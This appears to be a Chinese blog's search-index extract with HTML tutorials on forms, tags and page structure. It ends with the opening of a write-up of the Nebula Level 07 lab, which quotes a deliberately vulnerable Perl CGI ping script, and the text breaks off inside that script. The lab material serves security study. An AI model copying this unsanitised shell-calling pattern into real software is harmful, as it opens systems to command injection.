时，当前项即为默认选中项。 </li></ol><p>&lt;!DOCTYPE html&gt;</p><html lang="en"><head>    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <meta http-equiv="X-UA-Compatible" content="ie=edge">    <title>select下拉表单</title></head><body>    <form>    籍贯:     <select>        <option>山东</option>        <option>北京</option>        <option>天津</option>        <option selected="selected">火星</option>    </select></form></body></html><h4 id="3-4-4-lt-textarea-gt-表单元素"><a href="#3-4-4-lt-textarea-gt-表单元素" class="headerlink" title="3.4.4 &lt;textarea&gt;表单元素"></a>3.4.4 <code>&lt;textarea&gt;</code>表单元素</h4><p><strong>语法：</strong></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">rows</span>=<span class="string">&quot;3&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;20&quot;</span>&gt;</span> </span><br><span class="line">文本内容 </span><br><span class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure><ol><li>通过 <code>&lt;textarea&gt;</code> 标签可以轻松地创建多行文本输入框。 </li><li>cols=“每行中的字符数” ，rows=“显示的行数”，我们在实际开发中不会使用，都是用 CSS 来改变大小。 </li></ol><p>&lt;!DOCTYPE html&gt;</p><html lang="en"><head>    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <meta http-equiv="X-UA-Compatible" content="ie=edge">    <title>textarea 文本域</title></head><body>    <form>        今日反馈:        <textarea cols="50" rows="5">我真帅</textarea>    </form></body></html><p><strong>案例2-注册页面：</strong></p><p>&lt;!DOCTYPE html&gt;</p><html lang="en"><head>    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <meta http-equiv="X-UA-Compatible" content="ie=edge">    <title>案例2-注册页面</title></head><body>    <h3> 青春不常在，抓紧谈恋爱</h3>    <table width="600">        <!-- 第一行 -->        <tr>            <td>性别</td>            <td>                <input type="radio" name="sex" id="nan"><label  for="nan"><img src="images/man.jpg" ></label> 男                  <input type="radio" name ="sex" id="nv"><label for="nv"><img src="images/women.jpg" ></label > 女             </td>        </tr>        <!-- 第二行 -->        <tr>            <td>生日</td>            <td>                <select>                    <option>---请选择年份---</option>                    <option>2001</option>                              <option>2002</option>                              <option>2003</option>                          </select>                <select>                    <option>---请选择月份---</option>                    <option>1</option>                              <option>2</option>                              <option>3</option>                          </select>                <select>                    <option>---请选择日---</option>                    <option>1</option>                              <option>2</option>                              <option>3</option>                          </select>            </td>        </tr>        <!-- 第三行 -->        <tr>            <td>所在地区</td>            <td><input type=text value="北京思密达"></td>        </tr>        <!-- 第四行 -->        <tr>            <td>婚宴状况:</td>            <td><input type="radio" checked=checked name=marry>未婚 <input type="radio" name=marry>已婚 <input type="radio" name=marry>离婚</td>        </tr>        <!-- 第五行 -->        <tr>            <td>学历:</td>            <td><input type=text value=博士后></td>        </tr>        <!-- 第六行 -->        <tr>            <td>喜欢的类型:</td>            <td>                <input type="checkbox" name=love>妩媚的                <input type="checkbox" name=love>可爱的                <input type="checkbox" name=love>小鲜肉                <input type="checkbox" name=love>老腊肉                <input type="checkbox" name=love checked="checked">都喜欢            </td>        </tr>        <!-- 第七行 -->         <td>个人介绍</td>         <td>            <textarea>个人简介</textarea>         </td>         <!-- 第八行 -->          <tr>            <td></td>            <td><input type="submit" value="免费注册"></td>          </tr>          <tr>            <td></td>            <td><input type="checkbox" checked=checked>我同意注册条款和会员加入标准</td>          </tr>          <tr>            <td></td>            <td><a href=# >我是会员，立即登录</a></td>          </tr>          <tr>            <td></td>            <td>                <h5>我承诺</h5>                <ul>                    <li>年满18岁、单身</li>                    <li>抱着严肃的态度</li>                    <li>真诚寻找另一半</li>                </ul>            </td>          </tr>    </table></body></html>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> HTML </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 前端三剑客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML_Day1</title>
      <link href="/2025/07/23/HTML_Day1/"/>
      <url>/2025/07/23/HTML_Day1/</url>
      
        <content type="html"><![CDATA[<h1 id="HTML简介"><a href="#HTML简介" class="headerlink" title="HTML简介"></a>HTML简介</h1><p> 我们接下来是进行的网页开发网页的相关概念:</p><ul><li>什么是网页?</li><li>什么是HTML?</li><li>网页的形成?</li></ul><h2 id="1-网页"><a href="#1-网页" class="headerlink" title="1. 网页"></a>1. 网页</h2><h3 id="1-1-什么是网页："><a href="#1-1-什么是网页：" class="headerlink" title="1.1 什么是网页："></a>1.1 什么是网页：</h3><ol><li>网站是指在因特网上根据一定的规则，使用 HTML 等制作的用于展示特定内容相关的网页集合。</li><li>网页是网站中的一“页”，通常是 HTML 格式的文件，它要通过浏览器来阅读。</li><li>网页是构成网站的基本元素，它通常由图片、链接、文字、声音、视频等元素组成。通常我们看到的网页， 常见以 .htm 或 .html 后缀结尾的文件，因此将其俗称为 HTML 文件。 </li></ol><h3 id="1-2-什么是HTML："><a href="#1-2-什么是HTML：" class="headerlink" title="1.2 什么是HTML："></a>1.2 什么是HTML：</h3><pre><code>1. HTML 指的是超文本标记语言 (Hyper Text Markup Language) ，它是用来描述网页的一种语言。1. HTML 不是一种编程语言，而是一种标记语言 (markup language)。 1. 标记语言是一套标记标签 (markup tag)。</code></pre><p>所谓超文本，有 2 层含义：  </p><ol><li>它可以加入图片、声音、动画、多媒体等内容（超越了文本限制 ）。</li><li>它还可以从一个文件跳转到另一个文件，与世界各地主机的文件连接（超级链接文本 ）。</li></ol><h3 id="1-3-网页的形成"><a href="#1-3-网页的形成" class="headerlink" title="1.3 网页的形成"></a>1.3 网页的形成</h3><p>网页是由网页元素组成的，这些元素是利用 html 标签描述出来，然后通过浏览器解析来显示给用户的。 </p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/%E7%BD%91%E9%A1%B5%E7%9A%84%E7%BB%84%E6%88%90.png" alt=""></p><p>前端人员开发代码   ——&gt;   浏览器显示代码（解析、渲染）   ——-&gt;   生成最后的 Web 页面 </p><h3 id="1-4-网页的总结："><a href="#1-4-网页的总结：" class="headerlink" title="1.4 网页的总结："></a>1.4 网页的总结：</h3><pre><code>   1. 网页是图片、链接、文字、声音、视频等元素组成, 其实就是一个html文件(后缀名为html)   2. 网页生成制作:  有前端人员书写 HTML 文件, 然后浏览器打开,就能看到了网页.   3. HTML: 超文本标记语言, 用来制作网页的一门语言. 有标签组成的. 比如 图片标签 链接标签 视频标签等…</code></pre><h2 id="2-浏览器："><a href="#2-浏览器：" class="headerlink" title="2. 浏览器："></a>2. 浏览器：</h2><h3 id="2-1-常用的浏览器"><a href="#2-1-常用的浏览器" class="headerlink" title="2.1 常用的浏览器"></a>2.1 常用的浏览器</h3><p>浏览器是网页显示、运行的平台。常用的浏览器有 IE、火狐（Firefox）、谷歌（Chrome）、Safari和Opera等。 平时称为五大浏览器。</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/%E6%B5%8F%E8%A7%88%E5%99%A8.png" alt=""></p><p>查看浏览器市场份额：<a href="http://tongji.baidu.com/data/browser">http://tongji.baidu.com/data/browser</a></p><h3 id="2-2-浏览器内核"><a href="#2-2-浏览器内核" class="headerlink" title="2.2 浏览器内核"></a>2.2 浏览器内核</h3><p>浏览器内核（渲染引擎）： 负责读取网页内容，整理讯息，计算网页的显示方式并显示页面。<br><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%86%85%E6%A0%B8.png" alt="浏览器内核"></p><p>目前国内一般浏览器都会采用 Webkit/Blink 内核，如 360、UC、QQ、搜狗等。</p><h2 id="3-Web标准"><a href="#3-Web标准" class="headerlink" title="3. Web标准"></a>3. Web标准</h2><p>Web 标准是由 W3C 组织和其他标准化组织制定的一系列标准的集合。W3C（万维网联盟）是国际最著名的标准化组织。</p><h3 id="3-1-为什么需要Web标准"><a href="#3-1-为什么需要Web标准" class="headerlink" title="3.1 为什么需要Web标准"></a>3.1 为什么需要Web标准</h3><p>浏览器不同，它们显示页面或者排版就有些许差异<br><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/web%E6%A0%87%E5%87%86.png" alt="web标准"></p><p>遵循 Web 标准除了可以让不同的开发人员写出的页面更标准、更统一外，还有以下优点：</p><ol><li><p>让 Web 的发展前景更广阔。 </p></li><li><p>内容能被更广泛的设备访问。</p></li><li><p>更容易被搜寻引擎搜索。</p></li><li><p>降低网站流量费用。</p></li><li><p>使网站更易于维护。</p></li><li><p>提高页面浏览速度。</p></li></ol><h3 id="3-2-web标准的构成："><a href="#3-2-web标准的构成：" class="headerlink" title="3.2 web标准的构成："></a>3.2 web标准的构成：</h3><p>   主要包括结构（Structure） 、表现（Presentation）和行为（Behavior）三个方面。<br><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/%E5%9B%BE%E7%89%8745.png" alt="图片45"><br>   Web 标准提出的最佳体验方案：<strong>结构、样式、行为相分离</strong>。<br>   简单理解：<strong>结构写到 HTML 文件中， 表现写到 CSS 文件中， 行为写到 JavaScript 文件中</strong></p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/image-20250722070701714.png" alt="image-20250722070701714"></p><h1 id="HTML标签（上）"><a href="#HTML标签（上）" class="headerlink" title="HTML标签（上）"></a>HTML标签（上）</h1><h2 id="1-HTML语法规范"><a href="#1-HTML语法规范" class="headerlink" title="1. HTML语法规范"></a>1. HTML语法规范</h2><h3 id="1-1-基本语法概述"><a href="#1-1-基本语法概述" class="headerlink" title="1.1 基本语法概述"></a>1.1 基本语法概述</h3><ol><li><p>HTML 标签是由尖括号包围的关键词，例如 <code>&lt;html&gt;</code>。</p></li><li><p>HTML 标签通常是成对出现的，例如 <code>&lt;html&gt;</code> 和 <code>&lt;/html&gt;</code> ，我们称为<strong>双标签</strong>。标签对中的第一个标签是开始标签，第二个标签是结束标签。 </p></li><li><p>有些特殊的标签必须是单个标签（极少情况），例如<code>&lt;br /&gt;</code>我们称为<strong>单标签</strong>。  ###标签的关系：</p></li></ol><h3 id="1-2-标签关系"><a href="#1-2-标签关系" class="headerlink" title="1.2 标签关系"></a>1.2 标签关系</h3><p>   双标签关系可以分为两类：包含关系和并列关系</p><ul><li>包含关系：</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span> <span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/%E5%A4%A7%E5%A4%B4%E5%84%BF%E5%AD%90.png" alt="大头儿子"></p><ul><li>并列关系：</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/%E7%86%8A%E5%A4%A7.png" alt=""> </p><h2 id="2-HTML基本结构标签："><a href="#2-HTML基本结构标签：" class="headerlink" title="2. HTML基本结构标签："></a>2. HTML基本结构标签：</h2><h3 id="2-1-第一个HTML网页"><a href="#2-1-第一个HTML网页" class="headerlink" title="2.1 第一个HTML网页"></a>2.1 第一个HTML网页</h3><p>每个网页都会有一个基本的结构标签（也称为骨架标签），页面内容也是在这些基本标签上书写。</p><p>HTML页面也称为 HTML 文档.</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span>    </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>      </span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>我的第一个页面<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line">Hello,World!    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/%E5%9F%BA%E6%9C%AC%E7%BB%93%E6%9E%84.png" alt="基本结构"> </p><p>HTML 文档的的后缀名必须是 .html 或 .htm ，浏览器的作用是读取 HTML 文档，并以网页的形式显示出它们。  此时，用浏览器打开这个网页，我们就可以预览我们写的第一个 HTML 文件了。</p><h3 id="2-2-基本结构标签总结"><a href="#2-2-基本结构标签总结" class="headerlink" title="2.2 基本结构标签总结"></a>2.2 基本结构标签总结</h3><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/image-20250722071706979.png" alt="image-20250722071706979"></p><h2 id="3-开发工具"><a href="#3-开发工具" class="headerlink" title="3. 开发工具"></a>3. 开发工具</h2><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/image-20250722071752965.png" alt="image-20250722071752965"><br><strong>VSCode的使用：</strong></p><ol><li><p>双击打开软件。</p></li><li><p>新建文件（Ctrl + N ）。</p></li><li><p>保存（Ctrl + S ）, 注意移动要保存为 .html 文件</p></li><li><p>Ctrl + 加号键 ，Ctrl + 减号键  可以放大缩小视图 </p></li><li><p>生成页面骨架结构。 输入! 按下 Tab 键。</p></li><li><p>利用插件在浏览器中预览页面：单击鼠标右键，在弹出窗口中点击“Open In Default Browser”。</p></li></ol><p><strong>VSCode 工具生成骨架标签新增代码：</strong> </p><ol><li><code>&lt;!DOCTYPE&gt;</code>标签</li><li>lang语言</li><li>charset字符集</li></ol><h3 id="3-1-文档类型声明标签"><a href="#3-1-文档类型声明标签" class="headerlink" title="3.1 文档类型声明标签"></a>3.1 文档类型声明标签</h3><p><code>&lt;!DOCTYPE html&gt;</code>  文档类型声明标签,告诉浏览器这个页面采取html5版本来显示页面.</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>这句代码的意思是: 当前页面采取的是 HTML5 版本来显示网页.</strong>  </p><p><strong>注意:</strong>   </p><ol><li>声明位于文档中的最前面的位置，处于标签之前。  </li><li>不是一个 HTML 标签，它就是文档类型声明标签。</li></ol><h3 id="3-2-lang-语言种类"><a href="#3-2-lang-语言种类" class="headerlink" title="3.2 lang 语言种类"></a>3.2 lang 语言种类</h3><p>用来定义当前文档显示的语言。</p><ol><li><p>en定义语言为英语</p></li><li><p>zh-CN定义语言为中文</p></li></ol><p>简单来说,定义为en 就是英文网页, 定义为 zh-CN 就是中文网页</p><p>其实对于文档显示来说，定义成en的文档也可以显示中文，定义成zh-CN的文档也可以显示英文</p><p>这个属性对浏览器和搜索引擎(百度.谷歌等)还是有作用的</p><h3 id="3-3-字符集"><a href="#3-3-字符集" class="headerlink" title="3.3 字符集"></a>3.3 字符集</h3><p>字符集 (Character set)是多个字符的集合。以便计算机能够识别和存储各种文字。  在标签内，可以通过 标签的 charset 属性来规定 HTML 文档应该使用哪种字符编码。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot; UTF-8&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>charset 常用的值有：GB2312 、BIG5 、GBK 和 UTF-8，其中 UTF-8 也被称为万国码，基本包含了全世界所 有国家需要用到的字符.</p><p><strong>注意：上面语法是必须要写的代码，否则可能引起乱码的情况。一般情况下，统一使用“UTF-8”编码，尽量 统一写成标准的 “UTF-8”，不要写成  “utf8” 或 “UTF8”。</strong> </p><h3 id="3-4-总结"><a href="#3-4-总结" class="headerlink" title="3.4 总结"></a>3.4 总结</h3><ol><li>以上三个代码 vscode 自动生成,基本不需要我们重写.  </li><li>文档类型声明标签,告诉浏览器这个页面采取html5版本来显示页面.  </li><li>告诉浏览器或者搜索引擎这是一个英文网站. 本页面采取英文来显示.  </li><li>必须写. 采取 UTF-8来保存文字. 如果不写就会乱码.具体原理后面分析.</li></ol><p>​       </p><h2 id="4-HTML常用标签"><a href="#4-HTML常用标签" class="headerlink" title="4. HTML常用标签"></a>4. HTML常用标签</h2><h3 id="4-1-标签语义"><a href="#4-1-标签语义" class="headerlink" title="4.1 标签语义"></a>4.1 标签语义</h3><p>学习标签是有技巧的，重点是记住每个标签的语义。简单理解就是指标签的含义，即这个标签是用来干嘛的。  </p><p>根据标签的语义，在合适的地方给一个最为合理的标签，可以让页面结构更清晰。</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/image-20250722072842335.png" alt="image-20250722072842335"></p><h3 id="4-2-标题标签-lt-h1-gt-lt-h6-gt-（重要"><a href="#4-2-标题标签-lt-h1-gt-lt-h6-gt-（重要" class="headerlink" title="4.2 标题标签 &lt;h1&gt; - &lt;h6&gt;（重要)"></a>4.2 标题标签 <code>&lt;h1&gt; - &lt;h6&gt;</code>（重要)</h3><p>为了使网页更具有语义化，我们经常会在页面中用到标题标签。HTML 提供了 6 个等级的网页标题， 即</p><p><code>&lt;h1&gt; - &lt;h6&gt;</code></p><pre><code>&lt;h1&gt; 我是一级标题 &lt;/h1&gt;</code></pre><p> 单词 head 的缩写，意为头部、标题。 </p><p> 标签语义：作为标题使用，并且依据重要性递减。   </p><p><strong>特点：</strong>  </p><ol><li><strong>加了标题的文字会变的加粗，字号也会依次变大。</strong>  </li><li><strong>一个标题独占一行。</strong></li></ol><p><h1>标题一共六级选,</h1></p><p><h2>文字加粗一行显。</h2></p><p><h3>由大到小依次减，</h3></p><p><h4>从重到轻随之变。</h4></p><p><h5>语法规范书写后，</h5></p><h6>具体效果刷新见。</h6><h3 id="4-3-段落标签（重要）"><a href="#4-3-段落标签（重要）" class="headerlink" title="4.3 段落标签（重要）"></a>4.3 段落标签（重要）</h3><p>在网页中，要把文字有条理地显示出来，就需要将这些文字分段显示。在 HTML 标签中，<code>&lt;p&gt;</code>定义段落，它可以将整个网页分为若干个段落。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span> 我是一个段落标签 <span class="tag">&lt;/<span class="name">p</span>&gt;</span> </span><br></pre></td></tr></table></figure><p>单词 paragraph [ˈpærəgræf] 的缩写，意为段落。  </p><p>标签语义：可以把 HTML 文档分割为若干段落。  </p><p><strong>特点：</strong>  </p><ol><li><strong>文本在一个段落中会根据浏览器窗口的大小自动换行。</strong></li><li><strong>段落和段落之间保有空隙。</strong></li></ol><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/image-20250722073517983.png" alt="image-20250722073517983"></p><h3 id="4-4-换行标签（重要）"><a href="#4-4-换行标签（重要）" class="headerlink" title="4.4 换行标签（重要）"></a>4.4 换行标签（重要）</h3><p>在 HTML 中，一个段落中的文字会从左到右依次排列，直到浏览器窗口的右端，然后才自动换行。如果希望某段文本强制换行显示，就需要使用换行标签 <code>&lt;br/&gt;</code>。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span> </span><br></pre></td></tr></table></figure><p>单词 break 的缩写，意为打断、换行。  </p><p>标签语义：强制换行。  </p><p><strong>特点：</strong>  </p><ol><li><strong><code>&lt;br/&gt;</code>是个单标签。</strong>  </li><li><strong><code>&lt;br/&gt;</code> 标签只是简单地开始新的一行，跟段落不一样，段落之间会插入一些垂直的间距。</strong></li></ol><h3 id="4-5-文本格式化标签（重要）"><a href="#4-5-文本格式化标签（重要）" class="headerlink" title="4.5 文本格式化标签（重要）"></a>4.5 文本格式化标签（重要）</h3><p>在网页中，有时需要为文字设置<strong>粗体</strong>、<em>斜体</em> 或<u>下划线</u>等效果，这时就需要用到 HTML 中的文本格式化标签，使 文字以特殊的方式显示。</p><p>标签语义: 突出重要性, 比普通文字更重要.</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%A0%87%E7%AD%BE.png" alt="格式化标签"></p><h3 id="4-6-lt-div-gt-和-lt-span-gt-标签"><a href="#4-6-lt-div-gt-和-lt-span-gt-标签" class="headerlink" title="4.6  &lt;div&gt; 和&lt;span&gt;标签"></a>4.6  <code>&lt;div&gt;</code> 和<code>&lt;span&gt;</code>标签</h3><p><code>&lt;div&gt;</code> 和 <code>&lt;span&gt;</code> 是没有语义的，它们就是一个盒子，用来装内容的。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span> 这是头部 <span class="tag">&lt;/<span class="name">div</span>&gt;</span>     </span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span> 今日价格 <span class="tag">&lt;/<span class="name">span</span>&gt;</span> </span><br></pre></td></tr></table></figure><p>div 是 division 的缩写，表示分割、分区。span 意为跨度、跨距。<br><strong>特点：</strong> </p><ol><li><strong><code>&lt;div&gt;</code> 标签用来布局，但是现在一行只能放一个<code>&lt;div&gt;</code>。 大盒子</strong> </li><li><strong><code>&lt;span&gt;</code> 标签用来布局，一行上可以多个<code>&lt;span&gt;</code>。小盒子</strong></li></ol><h3 id="4-7-图像标签和路径（重点）"><a href="#4-7-图像标签和路径（重点）" class="headerlink" title="4.7 图像标签和路径（重点）"></a>4.7 图像标签和路径（重点）</h3><h4 id="1-图像标签"><a href="#1-图像标签" class="headerlink" title="1.  图像标签"></a>1.  图像标签</h4><p>在 HTML 标签中，<code>&lt;img&gt;</code> 标签用于定义 HTML 页面中的图像。 </p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;图像URL&quot;</span> /&gt;</span> </span><br></pre></td></tr></table></figure><p>单词 image 的缩写，意为图像。<br>src 是<code>&lt;img&gt;</code>标签的必须属性，它用于指定图像文件的路径和文件名。<br>所谓属性：简单理解就是属于这个图像标签的特性。</p><p>图像标签的其他属性：</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/%E5%9B%BE%E7%89%87%E5%B1%9E%E6%80%A7.png" alt="图片属性"></p><p>图像标签属性注意点：</p><p>图像标签属性注意点：  </p><p>① 图像标签可以拥有多个属性，必须写在标签名的后面。  </p><p>② 属性之间不分先后顺序，标签名与属性、属性与属性之间均以空格分开。  </p><p>③ 属性采取键值对的格式，即 key=“value” 的格式，属性 =“属性值”。</p><h4 id="2-路径"><a href="#2-路径" class="headerlink" title="2. 路径"></a>2. 路径</h4><p>(1) 目录文件夹和根目录:  </p><p>实际工作中，我们的文件不能随便乱放，否则用起来很难快速的找到他们，因此我们需要一个文件夹来管理他们。  </p><p>目录文件夹：就是普通文件夹，里面只不过存放了我们做页面所需要的相关素材，比如 html 文件、图片等。   </p><p>根目录：打开目录文件夹的第一层就是根目录  </p><p>(2) 相对路径和绝对路径</p><p><strong>相对路径</strong>：以引用文件所在位置为参考基础，而建立出的目录路径。   </p><p>这里简单来说，图片相对于 HTML 页面的位置 </p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/%E8%B7%AF%E5%BE%84.png" alt="路径"></p><p>相对路径是从代码所在的这个文件出发，去寻找目标文件的，而我们这里所说的上一级 、下一级和同一级就是  图片相对于 HTML 页面的位置。</p><p><strong>绝对路径：</strong>是指目录下的绝对位置，直接到达目标位置，通常是从盘符开始的路径。</p><p>例如，“D:\web\img\logo.gif”或完整的网络地址“<a href="http://www.itcast.cn/images/logo.gif”。">http://www.itcast.cn/images/logo.gif”。</a></p><h3 id="4-8-超链接标签（重点）"><a href="#4-8-超链接标签（重点）" class="headerlink" title="4.8 超链接标签（重点）"></a>4.8 超链接标签（重点）</h3><p>在 HTML 标签中， 标签用于定义超链接，作用是从一个页面链接到另一个页面。  </p><ol><li>链接的语法格式  </li><li>链接的分类</li></ol><h4 id="1-链接的语法格式"><a href="#1-链接的语法格式" class="headerlink" title="1. 链接的语法格式"></a>1. 链接的语法格式</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;跳转目标&quot;</span> <span class="attr">target</span>=<span class="string">&quot;目标窗口的弹出方式&quot;</span>&gt;</span> 文本或图像 <span class="tag">&lt;/<span class="name">a</span>&gt;</span> </span><br></pre></td></tr></table></figure><p>单词 anchor [ˈæŋkə(r)] 的缩写，意为：锚。  </p><p>两个属性的作用如下： </p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/%E9%93%BE%E6%8E%A5.png" alt="链接"></p><p><code>_self</code>是当前窗口打开链接，<code>_blank</code>是新窗口打开。</p><h4 id="2-链接分类"><a href="#2-链接分类" class="headerlink" title="2. 链接分类"></a>2. 链接分类</h4><ol><li><p>外部链接: 例如 &lt; a href=”http:// www.baidu.com “&gt; 百度。</p></li><li><p>内部链接: 网站内部页面之间的相互链接. 直接链接内部页面名称即可，例如 &lt; a href=”index.html”&gt; 首页 。</p></li><li><p>空链接: 如果当时没有确定链接目标时，&lt; a href=”#”&gt; 首页  。 </p></li><li><p>下载链接: 如果 href 里面地址是一个文件或者压缩包，会下载这个文件。 </p></li><li><p>网页元素链接: 在网页中的各种网页元素，如文本、图像、表格、音频、视频等都可以添加超链接. </p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.baidu.com&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;img.png&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>锚点链接:  点我们点击链接,可以快速定位到页面中的某个位置.</p><ul><li>在链接文本的 href 属性中，设置属性值为 #名字 的形式，如<code>&lt;a href=&quot;#two&quot;&gt; 第2集 &lt;/a&gt;</code> </li></ul></li></ol><ul><li>找到目标位置标签，里面添加一个 id 属性 = 刚才的名字 ，如：<code>&lt;h3 id=&quot;two&quot;&gt;第2集介绍&lt;/h3&gt;</code> </li></ul><p>​    href指向的和id属性相同。</p><h2 id="5-HTML中的注释和特殊字符"><a href="#5-HTML中的注释和特殊字符" class="headerlink" title="5. HTML中的注释和特殊字符"></a>5. HTML中的注释和特殊字符</h2><h3 id="5-1-注释"><a href="#5-1-注释" class="headerlink" title="5.1 注释"></a>5.1 注释</h3><p>如果需要在 HTML 文档中添加一些便于阅读和理解但又不需要显示在页面中的注释文字，就需要使用注释标签。  HTML中的注释以“”结束。 </p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 注释语句 --&gt;</span>      快捷键: ctrl +  / </span><br></pre></td></tr></table></figure><p>一句话: 注释标签里面的内容是给程序猿看的, 这个代码是不执行不显示到页面中的.  添加注释是为了更好地解释代码的功能，便于相关开发人员理解和阅读代码，程序是不会执行注释内容的。 </p><h3 id="5-2-特殊字符"><a href="#5-2-特殊字符" class="headerlink" title="5.2 特殊字符"></a>5.2 特殊字符</h3><p>在 HTML 页面中，一些特殊的符号很难或者不方便直接使用，此时我们就可以使用下面的字符来替代。 </p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/Blog/%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6.png" alt="特殊字符"></p><p>包含课后作业以及代码都可以在我的<a href="https://github.com/hxd77/HTML">Github地址</a>上查看</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> HTML </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 前端三剑客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Exploit-Excercise-Nebula-7</title>
      <link href="/2025/06/03/Exploit-Excercise-Nebula-7/"/>
      <url>/2025/06/03/Exploit-Excercise-Nebula-7/</url>
      
        <content type="html"><![CDATA[<h2 id="Level-07-——-Perl脚本可执行任意文件漏洞"><a href="#Level-07-——-Perl脚本可执行任意文件漏洞" class="headerlink" title="Level 07 —— Perl脚本可执行任意文件漏洞"></a>Level 07 —— Perl脚本可执行任意文件漏洞</h2><h3 id="详情："><a href="#详情：" class="headerlink" title="详情："></a>详情：</h3><p>flag07 用户正在编写他们的第一个 Perl 程序，该程序允许他们 ping 主机，以检查是否可以从 Web 服务器访问它们。要执行此级别的操作，请以 level07 帐户和密码登录。此级别的文件位于 /home/flag07。</p><p>源代码如下：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/perl</span><br><span class="line"></span><br><span class="line">use CGI qw&#123;param&#125;;</span><br><span class="line"></span><br><span class="line">print &quot;Content-type: text/html\n\n&quot;;</span><br><span class="line"></span><br><span class="line">sub ping &#123;</span><br><span class="line">  $host = $_[0];</span><br><span class="line"></span><br><span class="line">  print(&quot;<span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>Ping results<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span 